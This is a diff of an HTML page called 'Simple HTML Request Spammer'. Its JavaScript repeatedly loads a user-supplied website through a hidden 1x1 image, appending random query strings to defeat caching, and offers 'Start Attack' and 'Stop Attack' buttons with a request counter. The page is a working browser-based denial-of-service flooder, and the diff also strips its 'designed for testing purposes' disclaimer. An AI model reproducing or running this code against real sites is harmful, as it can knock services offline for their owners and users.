@@ -18,6 +18,15 @@ a:active {
   color: inherit;
   text-decoration: underline;
 }
+.space1 {
+    padding-bottom: 9px;
+}
+.space2 {
+	padding-bottom: 1px;
+}
+.space4 {
+	padding-bottom: 30px;
+}
 </style>
 <title>Simple HTML Request Spammer</title>
 <link rel="preconnect" href="https://fonts.gstatic.com">
@@ -27,29 +36,48 @@ a:active {
 <center>
 <img id="idsd" width="1" height="1">
 <b>
-<span style="font-family: 'Josefin Sans', sans-serif; color: #00ff00; font-size: 45px;">
-<span style="color:#ff0000; font-size: 25px;">Intended usage of this software can be found <a href="https://wreeper.top/simplehttpspammer/usage.txt" style="color:#00ffff">here</a></span><br><br>
-Simple HTML Request Spammer<br><span style="font-size: 25px;">designed for testing purposes<br></span><br><br>
-<input id="host" placeholder="Website (including protocol)"><br><input id="delay" placeholder="Enter delay here (in ms)"><br><br><button onclick="start()">Start Attack</button><br><span style="font-family: 'Josefin Sans', sans-serif; color: #ff8c00; font-size: 25px;" id="msg"></span><br><br><span style="font-family: 'Josefin Sans', sans-serif; color: #00ffff; font-size: 25px;">developed by <a href="https://wreeper.top/" style="color:#ff0000">wreeper.top</a></span></span>
+<p class="space1"></p>
+<span style="font-family: 'Josefin Sans', sans-serif; color: #00ff00; font-size: 45px;">Simple HTML Request Spammer</span>
+<p class="space2"></p>
+<input id="host" placeholder="Website (including protocol)">
+<p></p>
+<input id="delay" placeholder="Enter delay here (in ms)">
+<p class="space2"></p>
+<div id="comandator"><button onclick="start()">Start Attack</button></div>
+<p class="space2"></p>
+<span style="font-family: 'Josefin Sans', sans-serif; color: #ff8c00; font-size: 25px;" id="msg"></span>
+<p class="space4"></p>
+<span style="font-family: 'Josefin Sans', sans-serif; color: #00ffff; font-size: 25px;">developed by <a href="https://wreeper.top/" style="color:#ff0000">wreeper.top</a></span>
 </b>
 </center>
 <script>
 var delay;
 var host;
+var spammer;
 var requests = 0;
 var randomIterator = 0;
+
+var emptymsg = '<span style="color:black">#</span>';
 
 function start() {
 delay = document.getElementById("delay").value;
 host = document.getElementById("host").value;
+spammer = setInterval(serve, delay);
 if (delay == 0) {
 document.getElementById("msg").innerHTML = "No delay specified.";
 } else if (host == 0) {
 document.getElementById("msg").innerHTML = "No host specified.";
 } else {
-setInterval(serve, delay);
-document.getElementById("msg").innerHTML = "Started attack on host " + host + " with delay " + delay + " (Requests sent: " + requests + ")";
+
+document.getElementById("comandator").innerHTML = '<button onclick="stop()">Stop Attack</button>';
 }
+}
+
+function stop() {
+document.getElementById("msg").innerHTML = "Attack stopped! " + requests + " requests sent to host " + host + "";
+clearInterval(spammer);
+requests = 0;
+document.getElementById("comandator").innerHTML = '<button onclick="start()">Start Attack</button>';
 }
 
 function serve() {
@@ -57,7 +85,7 @@ requests += 1;
 randomIterator = Math.floor(Math.random() * 899999999) + 100000000;
 var sourcer = host + "?x=" + randomIterator;
 document.getElementById("idsd").src = sourcer;
-document.getElementById("msg").innerHTML = "Started attack on host " + host + " with delay " + delay + " (Requests sent: " + requests + ")";
+document.getElementById("msg").innerHTML = "Attack on host " + host + " with delay " + delay + " (Requests sent: " + requests + ")";
 console.log(sourcer);
 }
 </script>
